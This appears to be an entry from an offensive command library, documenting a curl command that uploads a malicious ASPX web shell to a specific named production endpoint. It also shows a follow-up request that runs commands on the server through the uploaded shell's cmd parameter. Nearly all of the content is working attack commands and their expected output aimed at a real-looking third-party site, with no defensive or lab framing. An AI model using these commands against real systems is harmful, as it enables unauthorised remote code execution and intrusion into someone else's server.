---
data: >-
  curl -X POST https://mobile.starbucks.com.sg/upload.ashx -F "file=@shell.aspx"
  -v
tags:
  - rce
  - exploit
  - file-upload
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 36919aae-3fee-41a4-965e-bd67e84745a5
created_at: '2025-12-14T05:32:13.785Z'
updated_at: '2025-12-14T05:32:13.785Z'
verified: false
validated: true
submitted: true
---
# curl-malicious-upload

## Command

```bash
curl -X POST https://mobile.starbucks.com.sg/upload.ashx -F "file=@shell.aspx" -v
```

## Description

This command uploads a malicious ASPX shell file to the vulnerable endpoint, enabling subsequent RCE by accessing the file with command parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method for upload | Yes |
| `-F "file=@shell.aspx"` | Attaches the local shell file | Yes |
| `-v` | Verbose output | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://mobile.starbucks.com.sg/upload.ashx -F "file=@shell.aspx" -v
```

### Advanced Usage

```bash
curl -X POST https://mobile.starbucks.com.sg/upload.ashx -F "file=@shell.aspx" -F "name=profile" -v
```

### Execution Follow-up

```bash
curl "https://mobile.starbucks.com.sg/uploads/shell.aspx?cmd=dir" -v
```

## Expected Output

Upload success (200 OK), then command output like directory listing when accessed with ?cmd= parameter.

## Related

- [[Related Procedure: Upload-Malicious-File-for-RCE]]
